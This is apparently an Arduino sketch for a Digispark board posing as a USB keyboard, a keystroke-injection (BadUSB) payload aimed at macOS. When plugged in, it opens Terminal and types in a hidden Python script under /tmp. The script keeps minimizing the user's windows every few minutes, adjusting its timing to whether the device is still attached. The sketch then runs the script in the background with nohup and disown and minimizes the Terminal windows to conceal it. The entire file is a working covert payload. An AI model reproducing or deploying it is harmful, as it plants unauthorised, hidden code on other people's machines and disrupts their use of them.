#include <DigiKeyboard.h>
#include <avr/pgmspace.h>

void ptype(const char* s){char c;while((c=pgm_read_byte(s++))){DigiKeyboard.print(c);delay(8);}}
void pln(const char* s){ptype(s);DigiKeyboard.sendKeyStroke(KEY_ENTER);DigiKeyboard.delay(50);}

void setup() {
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(0x2C, MOD_GUI_LEFT);
  DigiKeyboard.delay(1200);
  ptype(PSTR("Terminal"));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000);

  pln(PSTR("cat>/tmp/.w.py<<'E'"));
  pln(PSTR("import subprocess,time"));
  pln(PSTR("def p():"));
  pln(PSTR(" r=subprocess.run(['hidutil','list'],capture_output=1,text=1,timeout=2)"));
  pln(PSTR(" return '16c0' in r.stdout.lower()"));
  pln(PSTR("while 1:"));
  pln(PSTR(" time.sleep(180 if p() else 480)"));
  pln(PSTR(" subprocess.run(['osascript','-e','tell application \"System Events\" to keystroke \"m\" using {command down}'])"));
  pln(PSTR("E"));
  pln(PSTR("nohup python3 /tmp/.w.py&disown;osascript -e 'tell app \"Terminal\" to set miniaturized of every window to true'"));
}
void loop(){DigiKeyboard.delay(1);}
